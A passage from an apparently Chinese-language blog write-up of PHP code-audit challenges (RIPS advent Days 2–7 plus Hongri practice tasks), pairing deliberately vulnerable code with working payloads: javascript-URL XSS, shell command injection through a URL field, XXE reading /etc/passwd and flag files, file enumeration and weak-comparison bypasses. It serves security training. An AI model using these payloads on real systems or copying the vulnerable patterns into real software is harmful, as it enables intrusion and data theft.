class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// composer require &quot;twig/twig&quot;</span><br><span class="line">require &apos;vendor/autoload.php&apos;;</span><br><span class="line"></span><br><span class="line">class Template &#123;</span><br><span class="line">  private $twig;</span><br><span class="line"></span><br><span class="line">  public function __construct() &#123;</span><br><span class="line">    $indexTemplate = &apos;&lt;img &apos; .</span><br><span class="line">      &apos;src=&quot;https://loremflickr.com/320/240&quot;&gt;&apos; .</span><br><span class="line">      &apos;&lt;a href=&quot;&#123;&#123;link|escape&#125;&#125;&quot;&gt;Next slide &amp;raquo;&lt;/a&gt;&apos;;</span><br><span class="line"></span><br><span class="line">    // Default twig setup, simulate loading</span><br><span class="line">    // index.html file from disk</span><br><span class="line">    $loader = new Twig\Loader\ArrayLoader([</span><br><span class="line">      &apos;index.html&apos; =&gt; $indexTemplate</span><br><span class="line">    ]);</span><br><span class="line">    $this-&gt;twig = new Twig\Environment($loader);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function getNexSlideUrl() &#123;</span><br><span class="line">    $nextSlide = $_GET[&apos;nextSlide&apos;];</span><br><span class="line">    return filter_var($nextSlide, FILTER_VALIDATE_URL);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function render() &#123;</span><br><span class="line">    echo $this-&gt;twig-&gt;render(</span><br><span class="line">      &apos;index.html&apos;,</span><br><span class="line">      [&apos;link&apos; =&gt; $this-&gt;getNexSlideUrl()]</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(new Template())-&gt;render();</span><br></pre></td></tr></table></figure></p><p>两个过滤点，一个是twig模板引擎自带的<code>escape</code>过滤：<a href="https://twig.symfony.com/" target="_blank" rel="noopener">https://twig.symfony.com/</a><br><img src="http://static.zybuluo.com/Passer6y/d2kxuc28eilfju8y8yjs9gg7/image_1d3h1nlg3civ5ds1j531j3hfa8m.png" alt="image_1d3h1nlg3civ5ds1j531j3hfa8m.png-59kB"></p><p>也就是htmlspecialchars实现的过滤。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; (&amp; 符号)  ===============  &amp;amp;</span><br><span class="line">&quot; (双引号)  ===============  &amp;quot;</span><br><span class="line">&apos; (单引号)  ===============  &amp;apos;</span><br><span class="line">&lt; (小于号)  ===============  &amp;lt;</span><br><span class="line">&gt; (大于号)  ===============  &amp;gt;</span><br></pre></td></tr></table></figure></p><p>第二个点：<code>filter_var($nextSlide, FILTER_VALIDATE_URL)</code>，检测是否为一个合法的url。<br><img src="http://static.zybuluo.com/Passer6y/99b5s8tjxth70w8xy09b3izv/image_1d3id23jr83o1ql5g221q798hp1f.png" alt="image_1d3id23jr83o1ql5g221q798hp1f.png-78.6kB"></p><p>这里给出的payload：<code>?url=javascript://comment％250aalert(1)</code><br>即<code>%25-&gt;%</code>,<code>%0a-&gt;换行符</code>，二次url编码，第一次为传入时浏览器接码一次，第二次为解析时，浏览器解码换行符。<br>所以JavaScript伪协议和换行绕过了这个限制。</p><p>红日安全提供的一个练习题：<a href="https://xz.aliyun.com/t/2491" target="_blank" rel="noopener">https://xz.aliyun.com/t/2491</a><br><img src="http://static.zybuluo.com/Passer6y/exni8w11d1q6128wpj1a6bh4/image_1d3h7r9j1h6l1mr18obj8k1pl99.png" alt="image_1d3h7r9j1h6l1mr18obj8k1pl99.png-174.5kB"><br>显然这里不是考察orange的<code>parse_url</code>函数和<code>curl</code>处理host的差异，这里要求我们parse_url处理后的host以规定的域名结尾，所以我们可控的就是前面，</p><p>这里测试的php版本为5.5：</p><p>简单测试了一下<code>filter_var</code>的url合法检测情况(爆破的时候记得将brup的自动url编码关掉)<br><img src="http://static.zybuluo.com/Passer6y/x1n97mzh19ux97ccf1oqpgmo/image_1d3ifph741q6897h1cphv8lpq9.png" alt="image_1d3ifph741q6897h1cphv8lpq9.png-145kB"></p><p>其实这里漏了一个<code>%23</code>，没有<code>#</code>锚点的特殊功能，单纯只是一个字符<code>#</code><br><code>url=http://demo.com%23sec-redclub.com</code><br><img src="http://static.zybuluo.com/Passer6y/fcbi9ipc47c0lm0i6gjfo4z3/image_1d3ig21iil9g1msltf31tfig6n13.png" alt="image_1d3ig21iil9g1msltf31tfig6n13.png-57.2kB"></p><p>还有换成别的协议还能用分号绕过,这一步在命令执行里面很关键：<code>?url=demo://demo.com;sec-redclub.com</code><br><img src="http://static.zybuluo.com/Passer6y/xsdvqtime68sax2cys3mmy5z/image_1d3ig9skj1v56vm33qcvc79551j.png" alt="image_1d3ig9skj1v56vm33qcvc79551j.png-66.5kB"></p><p>再来看看着如何绕过第二步<code>parse_url($url)[&#39;host&#39;]</code>的正则匹配：<br><code>url=demo://demo.com;ls;sec-redclub.com</code><br><img src="http://static.zybuluo.com/Passer6y/q040o2i1a8whs6ieyf9zy20h/image_1d3igo5v5fsu1co2122s1s661852v.png" alt="image_1d3igo5v5fsu1co2122s1s661852v.png-60.3kB"></p><p>进一步构造：<br><img src="http://static.zybuluo.com/Passer6y/ed3203twwte2idgf4lvd2h65/image_1d3igsmjqlsm1fgg8no2mqjqb3c.png" alt="image_1d3igsmjqlsm1fgg8no2mqjqb3c.png-73.3kB"></p><p><img src="http://static.zybuluo.com/Passer6y/yi628zjazu8cxg87ou5wwimb/image_1d3igv7hi1e331m97sfaaia11p24p.png" alt="image_1d3igv7hi1e331m97sfaaia11p24p.png-90.6kB"><br>payload:<code>?url=demo://aa&quot;;ls;&quot;sec-redclub.com</code></p><p>读flag：<code>?url=demo://aa&quot;;cat${IFS}f1agi3hEre.php;&quot;sec-redclub.com</code></p><p><img src="http://static.zybuluo.com/Passer6y/dtp1etua594jkbsz05iihhpv/image_1d3ih2r5hidne3c1mlf9p5b0g56.png" alt="image_1d3ih2r5hidne3c1mlf9p5b0g56.png-105.4kB"></p><h2 id="Day-3-Snow-Flake"><a href="#Day-3-Snow-Flake" class="headerlink" title="Day 3 - Snow Flake"></a>Day 3 - Snow Flake</h2><p>题目源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">function __autoload($className) &#123;</span><br><span class="line">  include $className;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$controllerName = $_GET[&apos;c&apos;];</span><br><span class="line">$data = $_GET[&apos;d&apos;];</span><br><span class="line"></span><br><span class="line">if (class_exists($controllerName)) &#123;</span><br><span class="line">  $controller = new $controllerName($data[&apos;t&apos;], $data[&apos;v&apos;]);</span><br><span class="line">  $controller-&gt;render();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  echo &apos;There is no page with this name&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class HomeController &#123;</span><br><span class="line">  private $template;</span><br><span class="line">  private $variables;</span><br><span class="line"></span><br><span class="line">  public function __construct($template, $variables) &#123;</span><br><span class="line">    $this-&gt;template = $template;</span><br><span class="line">    $this-&gt;variables = $variables;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function render() &#123;</span><br><span class="line">    if ($this-&gt;variables[&apos;new&apos;]) &#123;</span><br><span class="line">      echo &apos;controller rendering new response&apos;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &apos;controller rendering old response&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>初看源码其实并不知道哪有漏洞，可控的点操作的东西小很少，而且也没有输出的地方。</p><p>可以看到文档中写到<code>class_exists()</code>的用法：<br><a href="http://php.net/manual/zh/function.class-exists.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.class-exists.php</a></p><p>默认是类不存在时调用<code>__autoload()</code>函数的<br><img src="http://static.zybuluo.com/Passer6y/7ro3tmdipvmrk1en56k5fzhi/image_1d3iir49t1toq1jtibjn1ei5ems60.png" alt="image_1d3iir49t1toq1jtibjn1ei5ems60.png-61.6kB"></p><blockquote><p>文档中写到，<code>__autoload()</code>在php7.2已经废弃，取而代之的是<code>spl_autoload_register()</code></p></blockquote><p>还有一些会自动调用<code>__autoload()</code>函数的函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">call_user_func()</span><br><span class="line">call_user_func_array()</span><br><span class="line">class_exists()</span><br><span class="line">class_implements()</span><br><span class="line">class_parents()</span><br><span class="line">class_uses()</span><br><span class="line">get_class_methods()</span><br><span class="line">get_class_vars()</span><br><span class="line">get_parent_class()</span><br><span class="line">interface_exists()</span><br><span class="line">is_a()</span><br><span class="line">is_callable()</span><br><span class="line">is_subclass_of()</span><br><span class="line">method_exists()</span><br><span class="line">property_exists()</span><br><span class="line">spl_autoload_call()</span><br><span class="line">trait_exists()</span><br></pre></td></tr></table></figure></p><p>然而的是<code>PHP5~5.3</code>才能用<code>.</code>符号，在php5.4修复了这个问题，所以既不能目录穿越，也不能 包含当前目录下的<code>.php</code>等文件。</p><p>第二个漏洞产生的原因就是因为类名和其实例化传入的参数可控，导致我们可以控制php内部存在漏洞的类。</p><p>exp demo:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># 让php允许外部实体</span><br><span class="line">libxml_disable_entity_loader(false);</span><br><span class="line"></span><br><span class="line">$xml = &lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">EOF;</span><br><span class="line"></span><br><span class="line">$xml_class = new SimpleXMLElement($xml, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">var_dump($xml_class);</span><br><span class="line">// LIBXML_NOENT: 将xml实体引用替换成对应的值</span><br><span class="line">// LIBXML_DTDLOAD: 加载DOCTYPE中的DTD文件</span><br></pre></td></tr></table></figure></p><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=SimpleXMLElement&amp;d[v]=2&amp;d[t]=&lt;%3fxml+version%3d&quot;1.0&quot;%3f&gt;&lt;!DOCTYPE+ANY+[&lt;!ENTITY+xxe+SYSTEM+&quot;php%3a//filter/read%3dconvert.base64-encode/resource%3d/Users/passer6y/Documents/ctf/phpAuditLabs/day3_class_exists/f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe%3b&lt;/x&gt;</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/7iuecrkjgi7vv8zib4kqvgr6/image_1d3l18640p0iet686slngiko4k.png" alt="image_1d3l18640p0iet686slngiko4k.png-149.7kB"></p><blockquote><p>挺疑惑<code>SimpleXMLElement</code>第二个参数给2的原因..</p></blockquote><p>把结果输出出来了，这里得盲打xxe,这里挖个坑，以后再填。</p><p>下面来看一下红日安全提供的审计题：<br>index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class NotFound&#123;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        die(&apos;404&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(</span><br><span class="line">    function ($class)&#123;</span><br><span class="line">        new NotFound();</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$classname = isset($_GET[&apos;name&apos;]) ? $_GET[&apos;name&apos;] : null;</span><br><span class="line">$param = isset($_GET[&apos;param&apos;]) ? $_GET[&apos;param&apos;] : null;</span><br><span class="line">$param2 = isset($_GET[&apos;param2&apos;]) ? $_GET[&apos;param2&apos;] : null;</span><br><span class="line">if(class_exists($classname))&#123;</span><br><span class="line">    $newclass = new $classname($param,$param2);</span><br><span class="line">    var_dump($newclass);</span><br><span class="line">    foreach ($newclass as $key=&gt;$value)</span><br><span class="line">        echo $key.&apos;=&gt;&apos;.$value.&apos;&lt;br&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里使用的是<code>spl_autoload_register()</code>函数，简而言之是<code>__autoload()</code>的升级版，给<code>autoload</code>创建一个队列，逐个执行。<br>参数如下：<br><img src="http://static.zybuluo.com/Passer6y/n4i8ulfhg49ayrsffvd4kr3k/image_1d3jolk9iniis60kn1gdjgtn9.png" alt="image_1d3jolk9iniis60kn1gdjgtn9.png-20.3kB"></p><p>解题思路：<br>先使用内置类:<code>GlobIterator</code>,其构造函数用法：<br><img src="http://static.zybuluo.com/Passer6y/gt1x37dmotxaccdlwv5idew4/image_1d3l7e9kgvqg6oi1tpg193v1so09.png" alt="image_1d3l7e9kgvqg6oi1tpg193v1so09.png-28kB"><br>这样就可以搜索文件位置：</p><p><img src="http://static.zybuluo.com/Passer6y/kwbctp2a5b8mb7e30f1zozr9/image_1d3l7r40cmru1ks91ejm1oqk1mb39.png" alt="image_1d3l7r40cmru1ks91ejm1oqk1mb39.png-101kB"></p><p>找flag位置：<br><code>name=GlobIterator&amp;param=*.php&amp;param2=0</code><br><img src="http://static.zybuluo.com/Passer6y/se3ple48jt88cqj1n0mjh4d7/image_1d3l7vpenrinps6fff4pd172v9.png" alt="image_1d3l7vpenrinps6fff4pd172v9.png-105.9kB"></p><p>这里读取flag要使用php文件流的原因是因为xxe读取的文件中如果存在<code>&lt;&gt;&#39;&quot;&amp;</code>就会导致xml文件解析错误，所以就只能这样通过流的方式base64编码读出。</p><p>读flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=SimpleXMLElement&amp;param2=2&amp;param=&lt;%3fxml+version%3d&quot;1.0&quot;%3f&gt;&lt;!DOCTYPE+ANY+[&lt;!ENTITY+xxe+SYSTEM+&quot;php%3a//filter/read%3dconvert.base64-encode/resource%3d/Users/passer6y/Documents/ctf/phpAuditLabs/day3_class_exists/f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe%3b&lt;/x&gt;</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/bp8ipalptkf3yl9bwlc77k4p/image_1d3l7lomu1ii11qrglu1qgne5cm.png" alt="image_1d3l7lomu1ii11qrglu1qgne5cm.png-112.4kB"></p><h2 id="Day-4-False-Beard"><a href="#Day-4-False-Beard" class="headerlink" title="Day 4 - False Beard"></a>Day 4 - False Beard</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">class Login &#123;</span><br><span class="line">  public function __construct($user, $pass) &#123;</span><br><span class="line">    $this-&gt;loginViaXml($user, $pass);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function loginViaXml($user, $pass) &#123;</span><br><span class="line">    if (</span><br><span class="line">      (!strpos($user, &apos;&lt;&apos;) || !strpos($user, &apos;&gt;&apos;)) &amp;&amp;</span><br><span class="line">      (!strpos($pass, &apos;&lt;&apos;) || !strpos($pass, &apos;&gt;&apos;))</span><br><span class="line">    ) &#123;</span><br><span class="line">      $format = &apos;&lt;?xml version=&quot;1.0&quot;?&gt;&apos; .</span><br><span class="line">        &apos;&lt;user v=&quot;%s&quot;/&gt;&lt;pass v=&quot;%s&quot;/&gt;&apos;;</span><br><span class="line">      $xml = sprintf($format, $user, $pass);</span><br><span class="line">      $xmlElement = new SimpleXMLElement($xml);</span><br><span class="line">      // Perform the actual login.</span><br><span class="line">      $this-&gt;login($xmlElement);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new Login($_POST[&apos;username&apos;], $_POST[&apos;password&apos;]);</span><br></pre></td></tr></table></figure><p>去翻一下strpos的文档，里面也明确说明了这个问题，该函数返回查询字符首次出现的数字位置，如果在第一个字符位置则返回0，如果使用弱类型比较，则可能导致安全漏洞。<br><img src="http://static.zybuluo.com/Passer6y/bar1s9n2cbh7k4py40fjrfd3/image_1d3l9ophp150fghk1kojf6e1bklm.png" alt="image_1d3l9ophp150fghk1kojf6e1bklm.png-32.9kB"></p><p><img src="http://static.zybuluo.com/Passer6y/gk6pc3bvy0iiztn748tuqwbs/image_1d3l9p5tioho195riuc1jb81hs916.png" alt="image_1d3l9p5tioho195riuc1jb81hs916.png-102.5kB"></p><!--exp:--><p>红日安全提供的练习题，在api.php将用户的每一位数字和开奖的数字进行比较，相同位数越多则得到的奖金越多。</p><p><img src="http://static.zybuluo.com/Passer6y/62f5pkwj8qp0dp6nhfv6t4p6/image_1d3ls2gqc143u29l16k7kk9nee9.png" alt="image_1d3ls2gqc143u29l16k7kk9nee9.png-65.1kB"></p><p>使用的弱类型比较，如果从布尔型的角度想来，除了0,false,null其他都为真，则我们构造一个数组使其都为真即可：<br><img src="http://static.zybuluo.com/Passer6y/k07wpz266218avwnr2yki0hl/image_1d3ls6qaupgj4hj1nvu1vki1km99.png" alt="image_1d3ls6qaupgj4hj1nvu1vki1km99.png-103.6kB"></p><h2 id="Day-5-postcard"><a href="#Day-5-postcard" class="headerlink" title="Day 5 - postcard"></a>Day 5 - postcard</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">class Mailer &#123;</span><br><span class="line">  private function sanitize($email) &#123;</span><br><span class="line">    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) &#123;</span><br><span class="line">      return &apos;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return escapeshellarg($email);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function send($data) &#123;</span><br><span class="line">    if (!isset($data[&apos;to&apos;])) &#123;</span><br><span class="line">      $data[&apos;to&apos;] = &apos;none@ripstech.com&apos;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      $data[&apos;to&apos;] = $this-&gt;sanitize($data[&apos;to&apos;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!isset($data[&apos;from&apos;])) &#123;</span><br><span class="line">      $data[&apos;from&apos;] = &apos;none@ripstech.com&apos;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      $data[&apos;from&apos;] = $this-&gt;sanitize($data[&apos;from&apos;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!isset($data[&apos;subject&apos;])) &#123;</span><br><span class="line">      $data[&apos;subject&apos;] = &apos;No Subject&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!isset($data[&apos;message&apos;])) &#123;</span><br><span class="line">      $data[&apos;message&apos;] = &apos;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mail($data[&apos;to&apos;], $data[&apos;subject&apos;], $data[&apos;message&apos;],</span><br><span class="line">      &apos;&apos;, &quot;-f&quot; . $data[&apos;from&apos;]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mailer = new Mailer();</span><br><span class="line">$mailer-&gt;send($_POST);</span><br></pre></td></tr></table></figure><h2 id="Day6-Forst-Pattern"><a href="#Day6-Forst-Pattern" class="headerlink" title="Day6 - Forst Pattern"></a>Day6 - Forst Pattern</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">class TokenStorage &#123;</span><br><span class="line">  public function performAction($action, $data) &#123;</span><br><span class="line">    switch ($action) &#123;</span><br><span class="line">      case &apos;create&apos;:</span><br><span class="line">        $this-&gt;createToken($data);</span><br><span class="line">        break;</span><br><span class="line">      case &apos;delete&apos;:</span><br><span class="line">        $this-&gt;clearToken($data);</span><br><span class="line">        break;</span><br><span class="line">      default:</span><br><span class="line">        throw new Exception(&apos;Unknown action&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function createToken($seed) &#123;</span><br><span class="line">    $token = md5($seed);</span><br><span class="line">    file_put_contents(&apos;/tmp/tokens/&apos; . $token, &apos;...data&apos;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function clearToken($token) &#123;</span><br><span class="line">    $file = preg_replace(&quot;/[^a-z.-_]/&quot;, &quot;&quot;, $token);</span><br><span class="line">    unlink(&apos;/tmp/tokens/&apos; . $file);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$storage = new TokenStorage();</span><br><span class="line">$storage-&gt;performAction($_GET[&apos;action&apos;], $_GET[&apos;data&apos;]);</span><br></pre></td></tr></table></figure><p>关键点在<code>preg_replace(&quot;/[^a-z.-_]/&quot;, &quot;&quot;, $token);</code>将非从<code>a-z</code>,<code>.-_</code>替换为空，过滤不严，导致可以使用<code>../../</code>导致任意文件删除。</p><p>红日的练习题wp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line">if  (&quot;POST&quot; == $_SERVER[&apos;REQUEST_METHOD&apos;])</span><br><span class="line">&#123;</span><br><span class="line">    $password = $_POST[&apos;password&apos;];</span><br><span class="line">    if (0 &gt;= preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;, $password))  // [[:graph:]] ：匹配所有的可打印字符，等价于[^ \t\n\r\f\v]</span><br><span class="line">    &#123;</span><br><span class="line">        echo &apos;Wrong Format&apos;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    while (TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;       // 小写 大写 标点 数字</span><br><span class="line">        if (6 &gt; preg_match_all($reg, $password, $arr))&#123;</span><br><span class="line">            echo &quot;step2:&quot;.preg_match_all($reg, $password, $arr);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">            </span><br><span class="line">        $c = 0;</span><br><span class="line">        $ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;);</span><br><span class="line">        foreach ($ps as $pt)</span><br><span class="line">        &#123;</span><br><span class="line">            if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))</span><br><span class="line">            $c += 1;</span><br><span class="line">        &#125;</span><br><span class="line">        if ($c &lt; 3)&#123;</span><br><span class="line">            echo &quot;step3:&quot;.$c;</span><br><span class="line">            break;</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        if (&quot;42&quot; == $password) echo $flag;</span><br><span class="line">        else echo &apos;Wrong password&apos;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>使用科学计数法绕：<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=42.00e%2b00000000000  </span><br><span class="line">password=420.000000e-1</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/4tk87gintwbhckldfl59tsij/image_1d3mcuh2uvrp1vn8o9f1oii33613.png" alt="image_1d3mcuh2uvrp1vn8o9f1oii33613.png-78.4kB"><br> 加号注意要url编码，不然是空白字符，在burp的params中可以看到不编码的参数：<br> <img src="http://static.zybuluo.com/Passer6y/omewrf1bxj7cwwcddw41cko1/image_1d3md3ova1ue21ch922k1f8r1r2h1t.png" alt="image_1d3md3ova1ue21ch922k1f8r1r2h1t.png-73.3kB"></p><p><img src="http://static.zybuluo.com/Passer6y/j75i59edmo7srs09m5ehyte4/image_1d3md0at8158n1k8l13o1t8ll5d1g.png" alt="image_1d3md0at8158n1k8l13o1t8ll5d1g.png-78.6kB"></p><h2 id="Day-7-Bell"><a href="#Day-7-Bell" class="headerlink" title="Day 7 - Bell"></a>Day 7 - Bell</h2><p>考察的<code>parse_str</code>没有配置第二个参数导致变量覆盖。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 